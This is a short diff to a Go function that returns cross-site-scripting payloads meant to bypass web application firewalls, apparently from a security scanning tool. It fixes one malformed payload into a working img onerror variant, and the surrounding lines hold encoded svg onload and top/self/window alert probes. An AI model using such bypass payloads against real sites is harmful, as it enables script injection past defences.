@@ -319,7 +319,7 @@ func GetWafBypassPayloads() []Payload {
 		`<sVg/OnLoAd=%61%6c%65%72%74(1)>`,
 
 		// Using top/self/window
-		`<img src=x ontop=topalert(1)>`,
+		`<img src=x onerror=top.alert(1)>`,
 		`<img src=x onerror=self.alert(1)>`,
 		`<img src=x onerror=top.alert(1)>`,
 		`<img src=x onerror=window.alert(1)>`,
